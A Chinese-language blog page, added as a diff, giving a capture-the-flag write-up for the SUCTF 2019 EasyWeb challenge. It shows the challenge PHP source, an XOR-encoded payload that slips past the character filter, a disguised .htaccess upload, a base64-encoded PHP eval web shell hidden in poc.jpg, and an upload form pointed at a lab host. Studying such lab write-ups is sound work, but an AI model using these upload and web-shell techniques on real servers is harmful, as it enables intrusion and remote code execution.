@@ -1,0 +1,255 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>[SUCTF 2019]EasyWeb | why</title>
+    <meta name="author" content="why" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>WHY</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;WHY</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>[SUCTF 2019]EasyWeb</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/6/16
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function get_the_flag()&#123;</span><br><span class="line">    // webadmin will remove your upload file every 20 min!!!! </span><br><span class="line">    $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">    if(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!empty($_FILES[&quot;file&quot;]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];</span><br><span class="line">        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);</span><br><span class="line">    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;); </span><br><span class="line">        if(mb_strpos(file_get_contents($tmp_name), &#x27;&lt;?&#x27;)!==False) die(&quot;^_^&quot;);</span><br><span class="line">    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); </span><br><span class="line">        $path= $userdir.&quot;/&quot;.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[&#x27;_&#x27;];</span><br><span class="line"></span><br><span class="line">if (!$hhh)&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(strlen($hhh)&gt;18)&#123;</span><br><span class="line">    die(&#x27;One inch long, one inch strong!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( preg_match(&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;, $hhh) )</span><br><span class="line">    die(&#x27;Try something else!&#x27;);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, 3);</span><br><span class="line">if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);</span><br><span class="line"></span><br><span class="line">eval($hhh);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>直接给源码，这这这，不对吧</p>
+<p>好好看看这代码…</p>
+<p>怎么说呢</p>
+<p>看的出来是使用后面的那一串来引出前面那一串</p>
+<p>那怎么引用呢</p>
+<p>明显可以看出后面的那一串是和长度有关</p>
+<p>所以我们看着这个长度限制可以想到拟造get传参并异或</p>
+<p>我们先确定一下payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?.=$&#123;%80%80%80%80^%DF%C7%C5%D4&#125;&#123;%81&#125;();&amp;%81=get_the_flag</span><br></pre></td></tr></table></figure>
+
+<p>之后看看get_the_flag函数</p>
+<p>过滤了ph、&lt;?</p>
+<p>并且要求是图片文件？</p>
+<p>不是，这是文件上传？？？</p>
+<p>从未想过的全新玩法</p>
+<p>因为过滤了ph后缀</p>
+<p>所以我们想到了.htaccess</p>
+<p>所以我们要想的就是怎么让.htaccess变成图片识别</p>
+<p>我们发现了新东西</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在.htaccess前添加x00x00x8ax39x8ax39(要在十六进制编辑器中添加，或者使用python的bytes类型)</span><br><span class="line">x00x00x8ax39x8ax39 是wbmp文件的文件头</span><br><span class="line">.htaccess中以0x00开头的同样也是注释符，所以不会影响.htaccess</span><br></pre></td></tr></table></figure>
+
+<p>所以</p>
+<p>.htaccess</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line">php_value auto_prepend_file &quot;php://filter/convert.base64-decode/resource=./poc.jpg&quot;</span><br><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
+
+<p>poc.jpg</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a66#base64四位一解码，所以补两位</span><br><span class="line">PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==</span><br></pre></td></tr></table></figure>
+
+<p>之后使用php代码实现文件上传</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!--题目链接--&gt;</span><br><span class="line">&lt;form action=&quot;http://20052524-8eba-44ce-b01d-7334c953b20c.node5.buuoj.cn:81/?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%80&#125;();&amp;%80=get_the_flag&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;postedFile&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload/tmp_4247b8a5da98794f37ad36c75aaa5631/.htaccess</span><br><span class="line">upload/tmp_4247b8a5da98794f37ad36c75aaa5631/poc.jpg</span><br></pre></td></tr></table></figure>
+
+<p>之后直接连接蚁剑</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240616210726313.png" alt="image-20240616210726313"></p>
+<p>找到flag</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 why
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;why
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+<script src="/js/<file>"></script>
+<link rel="stylesheet" href="/css/<file>" />
+</body>
+</html>
